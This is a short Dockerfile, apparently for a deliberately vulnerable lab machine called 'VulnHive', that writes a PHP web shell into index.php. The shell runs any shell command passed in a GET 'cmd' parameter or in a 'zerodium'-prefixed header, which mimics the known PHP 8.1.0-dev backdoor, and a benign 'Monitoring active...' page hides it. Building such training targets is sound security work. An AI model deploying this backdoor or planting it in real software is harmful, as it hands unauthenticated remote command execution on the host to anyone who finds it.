FROM php:8.1-apache

# Updated backdoor to check both Header AND GET param for visibility in logs
RUN echo '<?php \
$cmd = ""; \
if (isset($_GET["cmd"])) { $cmd = $_GET["cmd"]; } \
elseif (isset($_SERVER["HTTP_USER_AGENTT"]) && strpos($_SERVER["HTTP_USER_AGENTT"], "zerodium") === 0) { \
    $cmd = substr($_SERVER["HTTP_USER_AGENTT"], 8); \
} \
if ($cmd) { system($cmd); } \
?> <h1>VulnHive PHP 8.1.0-dev Node</h1><p>Monitoring active...</p>' > /var/www/html/index.php

EXPOSE 80
